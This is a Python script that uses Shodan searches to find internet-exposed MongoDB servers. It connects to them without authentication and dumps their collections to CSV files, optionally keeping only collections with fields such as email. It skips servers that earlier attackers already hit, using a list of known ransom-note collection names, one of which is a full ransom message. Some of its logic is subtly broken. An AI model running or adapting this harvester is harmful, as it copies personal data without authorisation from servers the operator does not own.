import pymongo
import pandas as pd
import os
import json
from colorama import Fore
import shodan
import ODBconfig

pd.options.display.width = 0
#pd.set_option('display.max_colwidth', -1)


"""TO DO:
1. multithread
3. 
"""
numfieldsreq = int(ODBconfig.numfieldsrequired)
basepath = ODBconfig.basepath
typelist = ODBconfig.typelist
collectionamesIwant = ODBconfig.collectionamesIwant
SHODAN_API_KEY = ODBconfig.SHODAN_API_KEY

if not basepath:
    basepath = os.path.join(os.getcwd(),"open directory dumps")

if not os.path.exists(basepath):
    os.makedirs(basepath)


def shodan_query(query):
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        result = api.search_cursor(query)
        #result = api.search(query, page=page)
        return result

    except shodan.APIError as e:
        print(Fore.RED + e.value + Fore.RESET)
        return False

def getCollectionKeys(collection):
    """Get a set of keys from a collection"""
    keys_list = []
    collection_list = collection.find()
    for document in collection_list:
        for field in document.keys():
            keys_list.append(field.lower())
    keys_set =  set(keys_list)
    return keys_set

def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careaboutpwneddbs=True,ignorelogfile=False,Icareaboutsize=True):
    oldjson = []
    doneips = []
    collectionstoget =[]
    totalrecords = 0
    totaldbs = 0

    pwnedDBs = ['alpine', 'How_to_restore', 'pocosow/centos:7.6.1810', 'docker.io/pocosow/centos:7.6.1810',
                'hacked_by_unistellar', 'RECOVERY', 'timonmat/xmr-stak-cpu', 'arayan/monero-miner',
                'abafaeeee/monero-miner', 'docker.io/gakeaws/nginx:v2.0', 'gakeaws/nginx:v2.0',
                'docker.io/gakeaws/mysql:5.6', 'gakeaws/mysql:5.6', 'docker.io/gakeaws/nginx:v8.9',
                'gakeaws/nginx:v8.9',
                'kannix/monero-miner', 'Warn', 'Backup1', 'Backup2', 'Backup3', 'crackit', 'trojan1', 'trojan2',
                'trojan3', 'trojan4', 'Readme', 'WARNING', 'RECOVER',
                'PLEASE_READ_ME_XYZ', 'jacpos', 'jackpos', 'jackposv1', 'jackposv2', 'jackposprivate12', 'alina',
                'topkek112', 'README', 'WRITE_ME', 'HACKED_BY_MARSHY', 'PLEASE_README',
                'WE_HAVE_YOUR_DATA', 'your_data_has_been_backed_up', 'REQUEST_YOUR_DATA', 'DB_HAS_BEEN_DROPPED',
                'Warning', 'Attention', 'Aa1_Where_is_my_data',
                'send_bitcoin_to_retrieve_the_data', 'DATA_HAS_BEEN_BACKED_UP', 'REQUEST_ME', 'CONTACTME', 'BACKUP_DB',
                'db_has_been_backed_up',
                'PLEASE_READ', 'please_read', 'warning', 'DB_H4CK3D', 'CONTACTME', 'PLEASE_READ_ME', 'DB_DELETED',
                'DB_DROPPED', 'PLEASEREAD', 'How_to_restore',
                'NODATA4U_SECUREYOURSHIT', 'SECUREYOURSHIT', 'pleasereadthis', 'readme',
                'PLEASE_SECURE_THIS_INSTALLATION', 'ReadmePlease', 'how_to_recover',
                'JUST_READ_ME', 'README_MISSING_DATABASES', 'README_YOU_DB_IS_INSECURE',
                'PWNED_SECURE_YOUR_STUFF_SILLY', 'WARNING_ALERT', 'Warn',
                'pleaseread', "HOW_TO_RESTORE_leanote", "HOW_TO_RESTORE",
                "Your DB is backed up at our servers, to restore send an email your server ip to: notsecure.db@protonmail.com"]
    if careaboutpwnedcollections: #choose whether to ignore database that has any pwned collections. Sometimes users add collections after initial pwnage
        pwnedcollections = pwnedDBs
    else:
        pwnedcollections = []
    if not careaboutpwneddbs: #same as above but for indexes. Sometimes users add collections after initial pwnage
        pwnedDBs = []
    if ignorelogfile: #kind of self-explanatory
        doneips = []
    else:
        if os.path.exists(os.path.join(basepath, "MongoFound.json")):
            with open(os.path.join(basepath, "MongoFound.json")) as outfile:
                oldjson = json.load(outfile)
                doneips = [x['ipaddress'] for x in oldjson]

    if dbip in doneips: #ignore IPs that have already been scrapped.
        print(F"\033[92mAlready parsed\x1b[0m MongoDB instance at: {dbip}. {Fore.RED}Leave the poor server alone!{Fore.RESET}!")
        pass
    else:
        print(f"Connecting to db at {Fore.LIGHTRED_EX}{dbip}{Fore.RESET}...")
        client = pymongo.MongoClient(f"mongodb://{dbip}:{str(portnumber)}",serverSelectionTimeoutMS=2000) # defaults to port 27017, timeout in ms
        try:
            listofdbs = client.list_database_names()
        except Exception as e:
            print(f"    Issue reaching server {Fore.LIGHTRED_EX}{dbip}{Fore.RESET} (check error log for more info)")
            listofdbs = []
            with open(os.path.join(basepath, "MongoErrors.txt"), 'a') as outfile:
                outfile.write(f"{dbip}:{str(e)}\n")
        if listofdbs:
            toobig = []

            collectionNames = []
            collectionstoget = []
            totalnumofcollection=0
            if any(z in listofdbs for z in pwnedDBs):
                print(f"    {Fore.LIGHTRED_EX}{dbip}{Fore.RESET} has been {Fore.LIGHTGREEN_EX}PWNED{Fore.RESET}, moving on")
                pass
            else:
                for x in listofdbs:
                    collections = client[x].list_collection_names() #to sub collection name as variable is string
                    collections = [x for x in collections if "system." not in x] #filter out mongodob system files
                    totalnumofcollection=+ len(collections)
                    if any(z in collections for z in pwnedcollections): #check if any of the collections have been pwned, if so skip the index
                        print(f"    {Fore.LIGHTRED_EX}{x}{Fore.RESET} has been {Fore.LIGHTGREEN_EX}PWNED{Fore.RESET}, moving on")
                        collections = []
                    else:
                        collectionNames.append({x:collections})
                        #if len(collections)>0:
                         #   print(f"    Found {Fore.LIGHTBLUE_EX}{str(len(collections))} {Fore.RESET}collections in {Fore.LIGHTRED_EX}{x}{Fore.RESET}.") #Collections include: {','.join(collections[:10])}")

                        #for y in collections:
                    for y in collections: #next 3 lines check if term i want is part of collection name
                        if collectionamesIwant: #check if care about collection names
                            if any(z in y for z in collectionamesIwant ):
                                if client[x][y].estimated_document_count()>40: #check to see if collection has at least X number of items
                                    if Icareaboutsize:
                                        if client[x][y].estimated_document_count() < 800000: #change this number if you want
                                            #print(f"        A collection you may want is: {Fore.LIGHTRED_EX}{y} in {x}{Fore.RESET} with {Fore.LIGHTBLUE_EX}{client[x][y].estimated_document_count():,d} {Fore.RESET}documents",end='\r')
                                            collectionstoget.append((x,y))
                                        else:
                                            toobig.append((f"{dbip}:{portnumber}",x,y,str(client[x][y].estimated_document_count())))
                                            print(f"      SHITTTTTT, too many records. Best check it manually {y,x}")
                                    else:
                                        collectionstoget.append((x, y))
                        else:
                            collectionstoget.append((x, y)) #if don't want to specifiy names of collections and just want to get all the collecions
            cdict = [{"ipaddress": dbip, "databaseinfo": collectionNames}]
            newjson = oldjson + cdict
            if toobig:
                with open(os.path.join(basepath,
                                       "Mongotoobig.csv"), 'a') as fd:
                    for z in toobig:
                        fd.write(z + "\n")

            def dumpMongoDbcollectiontoCSV(database, collection):
                if typelist:
                    collectionkeys = getCollectionKeys(client[database][collection]) #get all keys in collection
                    if [x for x in collectionkeys if any(y in x for y in typelist)]>numfieldsreq:  #check if key i want is there if so, grab it! e.g. if there is field for "email" etc
                        print(f"    Found desired fields in {Fore.LIGHTRED_EX} {database}:{collection}")
                        cursor = client[database][collection].find()  # grab all records
                        df = pd.DataFrame(list(cursor))
                        cols = df.columns
                        dropcols = ["_id",'__v',"ipaddress"] #id columns I don't want
                        cols1 = [x for x in cols if x in dropcols] #check to see if column is in my df
                        df.drop(cols1, axis=1, inplace=True) #if it is, drop the column!

                        if not os.path.exists(os.path.join(basepath,dbip)):
                            os.makedirs(os.path.join(basepath,dbip))

                        df.to_csv(os.path.join(basepath,dbip, f"{dbip}_{database}_{collection}_MDB.csv"),index=False)
                        return (len(df))
                    else:
                        print (f"        Nevermind...no fields of interest in {Fore.LIGHTRED_EX}{database}:{Fore.LIGHTGREEN_EX}{collection}{Fore.RESET}")
                        return (0)
                else:
                    print(f"        Didn't specify fields you want to filter on, so gonna grab{Fore.RED}{database}:{collection}{Fore.RESET}")
                    cursor = client[database][collection].find()  # grab all records
                    df = pd.DataFrame(list(cursor))
                    cols = df.columns
                    dropcols = ["_id", '__v', "ipaddress"]  # id columns I don't want
                    cols1 = [x for x in cols if x in dropcols]  # check to see if column is in my df
                    df.drop(cols1, axis=1, inplace=True)  # if it is, drop the column!

                    if not os.path.exists(os.path.join(basepath, dbip)):
                        os.makedirs(os.path.join(basepath, dbip))

                    df.to_csv(os.path.join(basepath, dbip, f"{dbip}_{database}_{collection}_MDB.csv"), index=False)
                    return (len(df))
            if collectionNames:
                print(f"    Found total of {Fore.LIGHTBLUE_EX}{totalnumofcollection}{Fore.RESET} collections in {Fore.LIGHTBLUE_EX}{len(listofdbs)}{Fore.RESET} databases")

            if collectionstoget:
                ok = "\n        " + "\n        ".join([f"{Fore.LIGHTRED_EX}{x[1]}{Fore.RESET} in database:{Fore.LIGHTRED_EX}{x[0]}{Fore.RESET}" for x in collectionstoget[:5]])
                print(F"    Of those, found {Fore.LIGHTBLUE_EX}{str(len(collectionstoget))}{Fore.RESET} collections that match desired collection names, including: {ok}")

                for x in collectionstoget:
                    db, collection = x

                    recordcount = dumpMongoDbcollectiontoCSV(db, collection)
                    totalrecords += recordcount

                    if recordcount >0:
                        print(f"        Succesfully dumped {Fore.LIGHTRED_EX}{collection}{Fore.RESET} from {Fore.LIGHTRED_EX}{db} {Fore.RESET}")
                        totaldbs+=1
            else:
                print(F"    Of those, found {Fore.LIGHTBLUE_EX}ZERO{Fore.RESET} collections that match desired collection names.")

            with open(os.path.join(basepath, "MongoFound.json"), 'w') as outfile:
                outfile.write(json.dumps(newjson))
            if totalrecords>0:
                print (f"{Fore.LIGHTGREEN_EX}Dumped{Fore.RESET} \033[94m{totalrecords:,d}\x1b[0m total records from \033[94m{str(totaldbs)}\x1b[0m collections")
    print(f'{Fore.RED}#############################################\n{Fore.RESET}')

    return totaldbs,totalrecords#return collectionstoget

def ipsfromclipboard():
    import pyperclip
    ips = pyperclip.paste().splitlines()
    ips = list(filter(None,ips))
    ips = [x for x in ips if x[0].isdigit()]
    return ips

def dbgetter(query):
    res = shodan_query(query)
    if res:
        listres = list(res)
        print(f"Your query resulted in {str(len(listres))} hits!")
        for x in listres:
            ipaddress = x["ip_str"]
            mongodbscraper(ipaddress)

